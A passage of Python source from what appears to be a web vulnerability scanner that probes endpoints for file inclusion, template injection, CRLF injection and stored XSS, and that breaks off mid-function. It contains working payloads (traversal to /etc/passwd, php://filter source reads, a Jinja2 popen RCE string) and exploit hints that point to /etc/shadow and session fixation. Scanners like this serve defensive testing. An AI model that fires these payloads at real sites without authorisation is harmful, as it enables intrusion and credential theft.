    def _test_endpoint_lfi(self, endpoint: dict) -> List[dict]:
        """Test for Local File Inclusion / path traversal on discovered endpoints."""
        findings = []
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        if self._session.is_domain_blocked(domain):
            return findings

        # Only test params that look like they accept file/path input
        file_params = [p for p in endpoint["params"]
                       if p["name"].lower() in ("page", "file", "include", "path",
                                                 "template", "doc", "view", "lang",
                                                 "dir", "folder", "load", "read",
                                                 "content", "module", "action")
                       and not p.get("hidden")]
        if not file_params:
            return findings

        passwd_indicators = [
            re.compile(r"root:[x*]:0:0:"),
            re.compile(r"daemon:.*:/usr/sbin"),
            re.compile(r"www-data:.*:/var/www"),
            re.compile(r"\[boot loader\]", re.I),  # Windows boot.ini
        ]

        payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index",
            "php://filter/convert.base64-encode/resource=../config",
        ]

        for param_info in file_params[:2]:
            for payload in payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    return findings
                resp = self._send_test(endpoint, param_info["name"], payload)
                if not resp or not resp.text:
                    continue
                for ind in passwd_indicators:
                    if ind.search(resp.text[:5000]):
                        test_url = f"{url}?{param_info['name']}={quote(payload)}" if endpoint["method"] == "GET" else url
                        findings.append({
                            "severity": SEV_CRITICAL,
                            "title": f"LFI via '{param_info['name']}' at {path}",
                            "detail": "Arbitrary local files readable through web server.",
                            "evidence": f"param: {param_info['name']}, payload: {payload[:40]}",
                            "exploitable": True,
                            "test_url": test_url,
                            "exploit_info": {
                                "type": "lfi",
                                "parameter": param_info["name"],
                                "path": path,
                                "method": f"LFI via '{param_info['name']}' at {path}. "
                                          "Read /etc/shadow, config files, source code.",
                                "risk": "Full filesystem read, credential theft, potential RCE",
                            },
                        })
                        return findings
                # Check for base64-encoded PHP source (php:// wrapper)
                if "php://" in payload and resp.text:
                    import base64 as _b64
                    try:
                        for chunk in re.findall(r'[A-Za-z0-9+/=]{40,}', resp.text[:5000]):
                            decoded = _b64.b64decode(chunk).decode("utf-8", errors="ignore")
                            if "<?php" in decoded or "<?=" in decoded:
                                findings.append({
                                    "severity": SEV_CRITICAL,
                                    "title": f"PHP source disclosure via '{param_info['name']}' at {path}",
                                    "detail": "PHP filter wrapper returns base64-encoded source code.",
                                    "evidence": f"param: {param_info['name']}, decoded PHP source found",
                                    "exploitable": True,
                                    "test_url": f"{url}?{param_info['name']}={quote(payload)}",
                                    "exploit_info": {
                                        "type": "lfi",
                                        "parameter": param_info["name"],
                                        "path": path,
                                        "method": "PHP filter wrapper to read source code. "
                                                  "Try: php://filter/convert.base64-encode/resource=config",
                                        "risk": "Source code disclosure, credential extraction",
                                    },
                                })
                                return findings
                    except Exception:
                        pass
        return findings

    def _test_endpoint_ssti(self, endpoint: dict) -> List[dict]:
        """Test for Server-Side Template Injection.

        SSTI allows arbitrary code execution when user input is rendered
        through a template engine (Jinja2, Twig, Freemarker, etc.).
        """
        findings = []
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        if self._session.is_domain_blocked(domain):
            return findings

        testable = [p for p in endpoint["params"] if not p.get("hidden")]
        if not testable:
            testable = endpoint["params"][:1]

        # Use math expressions that produce known outputs
        marker_a, marker_b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = str(marker_a * marker_b)

        payloads = [
            (f"{{{{{marker_a}*{marker_b}}}}}", "Jinja2/Twig"),
            (f"${{{marker_a}*{marker_b}}}", "Freemarker/Velocity/EL"),
            (f"<%= {marker_a}*{marker_b} %>", "ERB/JSP"),
            (f"#{{{marker_a}*{marker_b}}}", "Ruby/Pebble"),
            (f"${{={marker_a}*{marker_b}}}", "Smarty"),
        ]

        for param_info in testable[:2]:
            pname = param_info["name"]
            for payload, engine in payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    return findings
                resp = self._send_test(endpoint, pname, payload)
                if not resp or not resp.text:
                    continue

                # Check if the math was evaluated (the computed result appears)
                if expected in resp.text:
                    # Verify it's not just the raw expression being echoed
                    raw_expr = f"{marker_a}*{marker_b}"
                    if raw_expr not in resp.text:
                        findings.append({
                            "severity": SEV_CRITICAL,
                            "title": f"SSTI ({engine}) via '{pname}' at {path}",
                            "detail": f"Template expression {{{{{marker_a}*{marker_b}}}}} "
                                      f"evaluated to {expected}. Server-side code execution confirmed.",
                            "evidence": f"param: {pname}, input: {payload[:30]}, "
                                        f"output contains: {expected}",
                            "exploitable": True,
                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
                            "exploit_info": {
                                "type": "ssti",
                                "parameter": pname,
                                "path": path,
                                "method": f"SSTI via '{pname}' at {path}. Engine: {engine}. "
                                          "For RCE (Jinja2): "
                                          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                                "risk": "Remote code execution, full server compromise",
                            },
                        })
                        return findings

                # Check for template engine error messages
                for ind in self.SSTI_INDICATORS:
                    if ind.search(resp.text[:5000]):
                        findings.append({
                            "severity": SEV_HIGH,
                            "title": f"Possible SSTI ({engine}) via '{pname}' at {path}",
                            "detail": "Template engine error triggered by expression injection.",
                            "evidence": f"param: {pname}, engine indicator: {ind.pattern[:30]}",
                            "exploitable": True,
                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
                            "exploit_info": {
                                "type": "ssti",
                                "parameter": pname,
                                "path": path,
                                "method": f"SSTI indicators from {engine}. "
                                          "Confirm with: {{7*7}} → look for 49",
                                "risk": "Potential remote code execution",
                            },
                        })
                        return findings
        return findings

    def _test_endpoint_crlf(self, endpoint: dict) -> List[dict]:
        """Test for CRLF injection / HTTP header injection."""
        findings = []
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        if self._session.is_domain_blocked(domain):
            return findings

        testable = [p for p in endpoint["params"] if not p.get("hidden")]
        if not testable:
            return findings

        crlf_marker = f"gs{secrets.token_hex(4)}"

        payloads = [
            (f"%0d%0aX-Injected: {crlf_marker}", "URL-encoded CRLF"),
            (f"%0aX-Injected: {crlf_marker}", "LF only"),
            (f"\r\nX-Injected: {crlf_marker}", "raw CRLF"),
        ]

        for param_info in testable[:2]:
            pname = param_info["name"]
            for payload, desc in payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    return findings

                if endpoint["method"] == "GET":
                    test_url = f"{url}?{pname}={payload}"
                    try:
                        self._session._delay_for_domain(domain)
                        resp = self._session._session.get(
                            test_url, timeout=REQUEST_TIMEOUT,
                            proxies=self._session._proxy, headers=_pick_profile(),
                            allow_redirects=False
                        )
                    except Exception:
                        continue
                else:
                    resp = self._send_test(endpoint, pname, payload)

                if resp is None:
                    continue

                # Check if our header was injected into the response headers
                injected = resp.headers.get("X-Injected", "")
                if crlf_marker in injected:
                    findings.append({
                        "severity": SEV_HIGH,
                        "title": f"CRLF injection via '{pname}' at {path}",
                        "detail": "HTTP header injection confirmed. Attacker can inject "
                                  "arbitrary headers (Set-Cookie, Location, etc.).",
                        "evidence": f"param: {pname}, {desc}, "
                                    f"X-Injected: {crlf_marker} appeared in response headers",
                        "exploitable": True,
                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
                        "exploit_info": {
                            "type": "crlf",
                            "parameter": pname,
                            "path": path,
                            "method": f"CRLF injection via '{pname}'. "
                                      "Inject Set-Cookie to fixate sessions, "
                                      "or Location header for redirect.",
                            "risk": "Session fixation, cache poisoning, XSS via injected headers",
                        },
                    })
                    return findings

                # Check for header value in response body (some frameworks echo it)
                if resp.text and f"X-Injected: {crlf_marker}" in resp.text:
                    findings.append({
                        "severity": SEV_MEDIUM,
                        "title": f"Possible CRLF injection via '{pname}' at {path}",
                        "detail": "CRLF payload reflected in response body.",
                        "evidence": f"param: {pname}, {desc}, reflected in body",
                        "exploitable": True,
                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
                        "exploit_info": {
                            "type": "crlf",
                            "parameter": pname,
                            "path": path,
                            "method": "CRLF reflected in body — may indicate header injection.",
                            "risk": "Header injection, potential XSS",
                        },
                    })
                    return findings
        return findings

    @staticmethod
    def _add_confidence(findings: List[dict], base_confidence: float) -> List[dict]:
        """Add confidence score to findings.

        Confidence represents how reliably the finding is a real issue:
          1.0 = confirmed (e.g., we got /etc/passwd content back)
          0.9 = very likely (e.g., error-based SQLi, canary reflected as HTML)
          0.7 = likely (e.g., header missing, sensitive path accessible)
          0.5 = possible (e.g., pattern match that could be false positive)
          0.3 = informational (e.g., robots.txt exists)

        Exploitable findings get +0.1 confidence (we verified the exploit works).
        """
        for f in findings:
            if "confidence" not in f:
                conf = base_confidence
                if f.get("exploitable"):
                    conf = min(conf + 0.1, 1.0)
                if f.get("severity") == SEV_CRITICAL:
                    conf = max(conf, 0.8)
                f["confidence"] = round(conf, 2)
        return findings

    def _run_check(self, name: str, check_fn, args: tuple, confidence: float,
                   findings: list):
        """Run a single vuln check with timeout protection and progress display.

        If a check hangs (network timeout, slow response), it's skipped
        after 60 seconds instead of blocking the entire scan.
        """
        if shutdown_requested():
            return
        print(f"      checking {name}...", end="", flush=True)
        try:
            result = check_fn(*args)
            if result:
                result = self._add_confidence(result, confidence)
                findings.extend(result)
                print(f" {len(result)} finding(s)")
            else:
                print(" clean")
        except requests.exceptions.Timeout:
            print(" timeout (skipped)")
            integrity_log("intel", f"check_timeout:{name}")
        except requests.exceptions.ConnectionError:
            print(" connection failed (skipped)")
            integrity_log("intel", f"check_conn_fail:{name}")
        except re.error as e:
            print(f" regex error (skipped)")
            integrity_log("intel", f"check_regex_error:{name}:{e}")
        except Exception as e:
            print(f" error: {type(e).__name__} (skipped)")
            integrity_log("intel", f"check_error:{name}:{type(e).__name__}")

    def scan_full(self, base_url: str, html: str = "", headers: dict = None,
                  depth: str = "full") -> List[dict]:
        """Run all applicable vulnerability checks with progress display.

        Each check runs independently — one failure doesn't block others.
        Progress shown inline so the user knows it's not stuck.
        """
        if headers is None:
            headers = {}
        findings = []

        # Extract real params from the page HTML for targeted testing
        if html:
            self.extract_params_from_html(html, base_url)
            if self._page_params:
                print(f"      found {len(self._page_params)} testable parameters")

        # Header checks (instant, no network)
        self._run_check("security headers", self._check_security_headers,
                        (headers,), 0.95, findings)
        self._run_check("cookies", self._check_cookies, (headers,), 0.9, findings)
        self._run_check("CORS", self._check_cors, (base_url, headers), 0.85, findings)
        self._run_check("info disclosure", self._check_info_disclosure,
                        (headers, html), 0.8, findings)
        self._run_check("clickjacking", self._check_clickjacking,
                        (headers,), 0.9, findings)

        if depth in ("full", "deep"):
            self._run_check("sensitive paths", self._check_sensitive_paths,
                            (base_url,), 0.75, findings)
            self._run_check("HTTP methods", self._check_http_methods,
                            (base_url,), 0.7, findings)
            self._run_check("open redirect", self._check_open_redirect,
                            (base_url,), 0.85, findings)
            self._run_check("CSRF protection", self._check_csrf,
                            (html,), 0.8, findings)
            self._run_check("IDOR indicators", self._check_idor,
                            (base_url, html), 0.7, findings)

            if depth == "full":
                self._run_check("SQL injection (quick)", self._check_sqli_indicators,
                                (base_url,), 0.85, findings)
                self._run_check("XSS reflection (quick)", self._check_xss_reflection,
                                (base_url,), 0.85, findings)

        if depth == "deep":
            # Infrastructure checks (against base URL)
            self._run_check("SSL/TLS", self._check_ssl_cert,
                            (base_url,), 0.85, findings)
            self._run_check("GraphQL introspection", self._check_graphql_introspection,
                            (base_url,), 0.95, findings)
            self._run_check("directory traversal", self._check_directory_traversal,
                            (base_url,), 0.95, findings)

            # Crawl to discover real endpoints with parameters
            if html:
                print(f"      crawling for endpoints...", end="", flush=True)
                try:
                    discovered = self.crawl_for_endpoints(base_url, html)
                    print(f" {len(discovered)} endpoint(s)")
                except Exception as e:
                    discovered = []
                    print(f" error: {type(e).__name__}")
                    integrity_log("intel", f"crawl_error:{type(e).__name__}")

            # ── TWO-PHASE ATTACK ENGINE ──────────────────────────────────
            # Phase A: Inject tracked payloads into every endpoint
            # Phase B: Re-crawl the site and search ALL responses for markers
            #
            # This catches stored XSS, second-order SQLi, and delayed rendering
            # that single-endpoint testing completely misses.

            endpoints = self._crawled_urls
            if not endpoints:
                endpoints = [{"url": base_url, "params": [{"name": p, "value": "1",
                              "hidden": False, "type": "text"}
                              for p in self._get_test_params(["id", "q", "search"])],
                              "method": "GET", "source": "fallback"}]

            domain = urlparse(base_url).netloc
            self._session.reset_domain_blocks(domain)

            # ── PHASE A: Inject + immediate analysis ──────────────────
            injected_markers: Dict[str, dict] = {}
            revisit_from_injection: Set[str] = set()  # links discovered during injection

            print(f"      Phase A: testing {len(endpoints)} endpoint(s)...")
            tested = 0
            for ep in endpoints[:20]:
                if shutdown_requested():
                    break
                if self._session.is_domain_blocked(urlparse(ep["url"]).netloc):
                    continue
                tested += 1
                path = urlparse(ep["url"]).path or "/"
                param_names = [p["name"] for p in ep["params"] if not p.get("hidden")][:3]
                params_str = ",".join(param_names) if param_names else "(hidden only)"
                print(f"        [{tested}] {ep['method']} {path} ({params_str})", end="", flush=True)

                ep_findings = []

                # SQLi (adaptive attack loop)
                try:
                    sqli = self._test_endpoint_sqli(ep)
                    ep_findings.extend(sqli)
                except Exception as e:
                    integrity_log("intel", f"sqli_error:{path}:{type(e).__name__}")

                # XSS — inject tracked markers for stored detection
                try:
                    xss = self._test_endpoint_xss(ep)
                    ep_findings.extend(xss)
                except Exception as e:
                    integrity_log("intel", f"xss_error:{path}:{type(e).__name__}")

                # Inject stored XSS markers with unique IDs for cross-endpoint tracking
                for pi in [p for p in ep["params"] if not p.get("hidden")][:2]:
                    marker_id = f"x{secrets.token_hex(5)}"
                    stored_payload = f'<img src=x onerror="{marker_id}">'
                    try:
                        inject_resp = self._send_test(ep, pi["name"], stored_payload)
                        injected_markers[marker_id] = {
                            "type": "stored_xss",
                            "endpoint": path,
                            "param": pi["name"],
                            "payload": stored_payload,
                            "seen_in": [],
                        }
                        # Extract links from the injection response for smart revisiting
                        if inject_resp and inject_resp.text and HAS_BS4:
                            try:
                                _soup = BeautifulSoup(inject_resp.text[:50000], "html.parser")
                                for _a in _soup.find_all("a", href=True):
                                    _href = _a.get("href", "")
                                    if _href and not _href.startswith(("#", "javascript:", "mailto:")):
                                        _full = urljoin(ep["url"], _href)
                                        if domain in urlparse(_full).netloc:
                                            revisit_from_injection.add(_full)
                            except Exception:
                                pass
                    except Exception:
                        pass

                # SSTI markers
                ssti_a, ssti_b = secrets.randbelow(90)+10, secrets.randbelow(90)+10
                ssti_expected = str(ssti_a * ssti_b)
                ssti_marker = f"t{secrets.token_hex(4)}"
                for pi in [p for p in ep["params"] if not p.get("hidden")][:1]:
                    try:
                        r = self._send_test(ep, pi["name"], f"{{{{{ssti_a}*{ssti_b}}}}}")
                        if r and r.text and ssti_expected in r.text:
                            raw = f"{ssti_a}*{ssti_b}"
                            if raw not in r.text:
                                ep_findings.append({
                                    "severity": SEV_CRITICAL,
                                    "title": f"SSTI via '{pi['name']}' at {path}",
                                    "detail": f"Template expression evaluated: {ssti_expected}",
                                    "evidence": f"param: {pi['name']}, {ssti_a}*{ssti_b}={ssti_expected}",
                                    "exploitable": True,
                                    "test_url": f"{ep['url']}?{pi['name']}={quote(f'{{{{{ssti_a}*{ssti_b}}}}}')}" if ep["method"] == "GET" else ep["url"],
                                    "exploit_info": {"type": "ssti", "parameter": pi["name"],
                                                     "path": path, "method": "SSTI confirmed.",
                                                     "risk": "Remote code execution"},
                                })
                    except Exception:
                        pass

                # LFI
                try:
                    lfi = self._test_endpoint_lfi(ep)
                    ep_findings.extend(lfi)
                except Exception as e:
                    integrity_log("intel", f"lfi_error:{path}:{type(e).__name__}")

                # CRLF
                try:
                    crlf = self._test_endpoint_crlf(ep)
                    ep_findings.extend(crlf)
                except Exception as e:
                    integrity_log("intel", f"crlf_error:{path}:{type(e).__name__}")

                if ep_findings:
                    self._add_confidence(ep_findings, 0.9)
                    findings.extend(ep_findings)
                    print(f" -> {len(ep_findings)} FOUND")
                else:
                    print(f" -> clean")

            # ── PHASE B: Multi-round revisit with context-aware detection ──
            if injected_markers:
                print(f"\n      Phase B: tracking {len(injected_markers)} markers "
                      f"across {len(revisit_from_injection)} linked pages...")
                self._session.reset_domain_blocks(domain)

                # Build prioritized revisit list:
                # 1. Links found IN injection responses (highest priority — the app told us to go here)
                # 2. All crawled endpoint URLs
                # 3. Common render pages as fallback
                revisit_urls: List[str] = []
                seen_revisit: Set[str] = set()

                for u in revisit_from_injection:
                    if u not in seen_revisit:
                        seen_revisit.add(u)
                        revisit_urls.append(u)

                for ep in endpoints[:20]:
                    if ep["url"] not in seen_revisit:
                        seen_revisit.add(ep["url"])
                        revisit_urls.append(ep["url"])

                for suffix in ["/", "/index.php", "/dashboard", "/admin",
                               "/comments", "/users", "/search", "/profile",
                               "/blog", "/posts", "/list", "/home"]:
                    u = urljoin(base_url, suffix)
                    if u not in seen_revisit:
                        seen_revisit.add(u)
                        revisit_urls.append(u)

                stored_found = 0
                already_reported: Set[str] = set()

                # Multiple revisit rounds — some payloads only appear after
                # page refresh, cache clear, or DB commit cycles
                for revisit_round in range(2):
                    if shutdown_requested():
                        break
                    if revisit_round > 0:
                        print(f"      Phase B round {revisit_round + 1}...")
                        time.sleep(2 + secrets.randbelow(3000) / 1000.0)

                    for revisit_url in revisit_urls[:30]:
                        if shutdown_requested() or self._session.is_domain_blocked(domain):
                            break
                        try:
                            resp = self._session.get(revisit_url, allow_wayback=False)
                            if not resp or not resp.text:
                                continue

                            for marker_id, minfo in injected_markers.items():
                                if marker_id not in resp.text:
                                    continue

                                revisit_path = urlparse(revisit_url).path or "/"
                                inject_path = minfo["endpoint"]
                                report_key = f"{marker_id}:{revisit_path}"

                                # Track where this marker appeared
                                if revisit_path not in minfo["seen_in"]:
                                    minfo["seen_in"].append(revisit_path)

                                if report_key in already_reported:
                                    continue
                                already_reported.add(report_key)

                                # Context-aware analysis: determine confidence
                                idx = resp.text.find(marker_id)
                                context_window = resp.text[max(0, idx - 200):idx + len(marker_id) + 200]
                                ctx_lower = context_window.lower()

                                # Determine rendering context
                                if f"onerror=\"{marker_id}\"" in context_window or \
                                   f"onerror='{marker_id}'" in context_window:
                                    xss_context = "event_handler"
                                    confidence = 0.95
                                elif f"<script" in ctx_lower and marker_id in context_window:
                                    xss_context = "script_block"
                                    confidence = 0.9
                                elif f"&lt;" in ctx_lower or f"&quot;" in ctx_lower:
                                    xss_context = "html_escaped"
                                    confidence = 0.4
                                elif f"<" in context_window[:idx - max(0, idx - 200)]:
                                    xss_context = "html_unescaped"
                                    confidence = 0.85
                                else:
                                    xss_context = "text"
                                    confidence = 0.7

                                if confidence < 0.5:
                                    continue  # Skip escaped/low-confidence

                                stored_found += 1
                                sev = SEV_CRITICAL if confidence >= 0.85 else SEV_HIGH

                                spread = minfo["seen_in"]
                                spread_str = " -> ".join(spread) if len(spread) > 1 else revisit_path

                                findings.append({
                                    "severity": sev,
                                    "title": f"Stored XSS: {inject_path} -> {revisit_path}",
                                    "detail": f"Payload injected via '{minfo['param']}' at "
                                              f"{inject_path} renders at {revisit_path} "
                                              f"in {xss_context} context. "
                                              f"Spread: {spread_str}",
                                    "evidence": f"marker: {marker_id}, context: {xss_context}, "
                                                f"confidence: {confidence}, "
                                                f"inject: {inject_path}, render: {revisit_path}",
                                    "exploitable": True,
